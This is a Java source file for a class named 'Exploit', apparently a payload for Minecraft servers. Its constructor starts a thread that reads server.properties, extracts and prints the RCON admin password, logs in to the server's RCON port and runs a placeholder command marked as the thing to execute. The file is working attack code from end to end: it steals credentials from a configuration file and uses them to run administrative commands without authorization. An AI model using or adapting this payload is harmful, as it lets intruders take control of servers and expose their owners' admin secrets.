import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Properties;

public class Exploit {

    public Exploit() throws Exception {
        new Thread(() -> {
            try {
                RconCredential cred = loadProperties();
                System.out.println(cred);

                // TODO: Command to execute
                String command = "give @a diamond 64";
                send_command(cred, command);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void send_command(RconCredential cred, String command) throws Exception {
        try (Socket socket = new Socket(cred.host, cred.port)) {
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            DataInputStream in = new DataInputStream(socket.getInputStream());

            // Send login packet
            sendPacket(out, 0, 3, cred.password);
            readResponse(in);
            // Send command packet
            sendPacket(out, 1, 2, command);
            readResponse(in);
        }
    }

    private static void sendPacket(DataOutputStream out, int ident, int kind, String payload) throws Exception {
        byte[] payloadBytes = payload.getBytes("UTF-8");
        int size = 4 + 4 + payloadBytes.length + 2; // ident + kind + payload + 2 null bytes

        ByteBuffer buffer = ByteBuffer.allocate(4 + size).order(ByteOrder.LITTLE_ENDIAN);
        buffer.putInt(size);
        buffer.putInt(ident);
        buffer.putInt(kind);
        buffer.put(payloadBytes);
        buffer.put((byte) 0);
        buffer.put((byte) 0);

        out.write(buffer.array());
        out.flush();
    }

    private static void readResponse(DataInputStream in) throws Exception {
        byte[] sizeBytes = new byte[4];
        in.readFully(sizeBytes);
        ByteBuffer bb = ByteBuffer.wrap(sizeBytes).order(ByteOrder.LITTLE_ENDIAN);
        int size = bb.getInt();

        byte[] payload = new byte[size];
        in.readFully(payload);

        System.out.println(new String(payload, "UTF-8"));
    }

    public static RconCredential loadProperties() throws Exception {
        Properties props = new Properties();
        RconCredential cred = new RconCredential();

        try (FileInputStream fis = new FileInputStream("server.properties")) {
            props.load(fis);
        }
        System.out.println(props);

        String host = "127.0.0.1";
        int port = Integer.parseInt(props.getProperty("rcon.port", "25575"));
        String password = props.getProperty("rcon.password");
        if (password == null || password.isEmpty()) {
            throw new Exception("Missing rcon.password in server.properties");
        }

        cred.host = host;
        cred.port = port;
        cred.password = password;
        return cred;
    }

    static class RconCredential {
        String host = "localhost";
        int port;
        String password;

        @Override
        public String toString() {
            return "RconCredential{" +
                    "host='" + host + '\'' +
                    ", port=" + port +
                    ", password='" + password + '\'' +
                    '}';
        }
    }
}
